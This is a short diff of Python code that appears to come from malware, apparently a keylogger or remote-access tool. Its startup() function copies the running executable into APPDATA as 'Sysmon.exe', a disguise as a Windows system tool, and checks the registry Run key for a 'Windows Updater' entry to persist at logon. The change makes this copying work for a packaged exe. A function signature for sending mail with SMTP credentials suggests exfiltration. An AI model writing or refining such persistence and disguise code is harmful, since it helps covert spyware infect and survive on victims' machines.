@@ -36,7 +36,7 @@ def sendmailg(gserver , gport ,guser, gpass , mailfrom , mailto , subject , msg 
 def startup():
 	dirapp = os.path.expanduser(os.getenv("APPDATA")) + "\\Sysmon.exe"
 	if not os.path.exists(dirapp): 
-		shutil.copy2(sys.argv[0] , dirapp);
+		shutil.copyfile(sys.executable , dirapp);
 	
 	regquery = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Updater"').read()
 	if regquery.find(dirapp) < 0:
